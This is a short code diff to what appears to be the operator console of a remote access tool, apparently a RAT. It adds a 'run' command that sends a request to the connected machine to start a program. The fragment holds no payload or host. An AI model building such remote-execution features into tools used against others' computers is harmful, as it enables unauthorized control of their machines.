@@ -37,6 +37,9 @@ namespace RATClient
                     case "message":
                         SendCommand(CMDS);
                         break;
+                    case "run":
+                        SendCommand(CMDS);
+                        break;
                     case "help":
                         Help();
                         break;
@@ -75,6 +78,7 @@ namespace RATClient
             Console.WriteLine("CONNECT        Start A Connection");
             Console.WriteLine("MESSAGE        Send A Message To The Server");
             Console.WriteLine("DISCONNECT     End A Connection");
+            Console.WriteLine("RUN            Run A Program");
             Console.WriteLine("HELP           List Commands");
         }
         static T DeserializeFromXml<T>(string xml)
